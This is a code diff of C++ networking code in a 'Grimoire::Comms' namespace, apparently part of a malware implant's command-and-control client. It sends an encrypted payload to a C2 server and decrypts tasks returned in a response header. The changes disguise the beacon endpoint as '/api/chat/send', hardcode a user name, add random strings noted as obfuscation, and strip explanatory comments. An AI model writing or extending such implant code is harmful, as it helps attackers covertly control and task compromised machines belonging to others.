@@ -318,7 +318,7 @@ namespace Grimoire::Comms {
                 {"auth", encrypted_payload_b64},
                 // 使用随机字符串增加混淆度
                 {"question", Utils::GenerateRandomString(16)},
-                {"user", "DefaultUserName"} // 可以使用真实的系统用户名或预设值
+                {"user", "Nebu1ea"}
             };
             std::string json_payload = external_payload.dump();
 
@@ -328,12 +328,12 @@ namespace Grimoire::Comms {
             // 清空上次捕获的 Header
             incoming_task_header_.clear();
 
-            // 关键设置：设置 Header 回调和用户指针
+            // 设置 Header 回调和用户指针
             curl_easy_setopt(curl_handle_, CURLOPT_HEADERFUNCTION, HeaderCallback);
             curl_easy_setopt(curl_handle_, CURLOPT_HEADERDATA, this);
 
             // 设置 URL 和 POST 方法
-            std::string data_url = c2_url_ + "data";
+            std::string data_url = c2_url_ + "/api/chat/send";
             curl_easy_setopt(curl_handle_, CURLOPT_URL, data_url.c_str());
             curl_easy_setopt(curl_handle_, CURLOPT_POST, 1L);
 
@@ -364,8 +364,10 @@ namespace Grimoire::Comms {
                 return {};
             }
 
-            // 解密任务：Header 包含 Base64(IV | CT | TAG)
+            // Header 包含 Base64(IV | CT | TAG)
             std::cout << "[Comms] Encrypted task received in header. Decrypting..." << std::endl;
+
+
             return crypto_manager_->DecryptPayload(incoming_task_header_);
 
         } catch (const std::exception& e) {
